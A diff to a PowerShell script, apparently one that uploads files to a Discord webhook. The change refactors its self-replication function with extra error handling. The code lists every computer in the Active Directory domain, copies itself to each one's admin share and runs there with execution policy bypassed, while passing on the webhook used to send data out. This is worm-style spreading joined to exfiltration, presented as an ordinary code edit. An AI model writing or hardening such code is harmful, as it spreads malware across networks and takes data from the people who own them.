@@ -64,28 +64,31 @@ function Get-FilesInRotation {
 }
 
 # Function to replicate the script to other computers and execute it
-function Replicate-Script {
+function Try-ReplicateScript {
     param (
         [string]$scriptPath,
         [string]$webhookUrl
     )
 
-    # Get all computers in the domain
-    $computers = Get-ADComputer -Filter * | Select-Object -ExpandProperty Name
-    foreach ($computer in $computers) {
-        try {
-            # Copy the script to the target computer
-            Copy-Item -Path $scriptPath -Destination "\\$computer\C$\Windows\Temp\" -Force -ErrorAction Stop
+    try {
+        # Get all computers in the domain
+        $computers = Get-ADComputer -Filter * | Select-Object -ExpandProperty Name
+        foreach ($computer in $computers) {
+            try {
+                # Copy the script to the target computer
+                Copy-Item -Path $scriptPath -Destination "\\$computer\C$\Windows\Temp\" -Force
 
-            # Execute the script on the target computer
-            Invoke-Command -ComputerName $computer -ScriptBlock {
-                param ($scriptPath, $webhookUrl)
-                powershell.exe -ExecutionPolicy Bypass -File $scriptPath
-            } -ArgumentList "\\$computer\C$\Windows\Temp\upload_to_discord.ps1", $webhookUrl -Credential (Get-Credential) -ErrorAction Stop
-        } catch {
-            Write-Host "Failed to replicate or execute on $computer: $_"
-            continue
+                # Execute the script on the target computer
+                Invoke-Command -ComputerName $computer -ScriptBlock {
+                    param ($scriptPath, $webhookUrl)
+                    powershell.exe -ExecutionPolicy Bypass -File $scriptPath
+                } -ArgumentList "\\$computer\C$\Windows\Temp\upload_to_discord.ps1", $webhookUrl -Credential (Get-Credential)
+            } catch {
+                Write-Host "Failed to replicate or execute on $computer: $_"
+            }
         }
+    } catch {
+        Write-Host "Failed to get the list of computers: $_"
     }
 }
 
@@ -117,8 +120,8 @@ foreach ($drive in $drives) {
     }
 }
 
-# Replicate the script to other computers
-Replicate-Script -scriptPath $MyInvocation.MyCommand.Definition -webhookUrl $webhookUrl
+# Try to replicate the script to other computers
+Try-ReplicateScript -scriptPath $MyInvocation.MyCommand.Definition -webhookUrl $webhookUrl
 
 # Close all windows and stop the script after 20 seconds
 Start-Sleep -Seconds 20
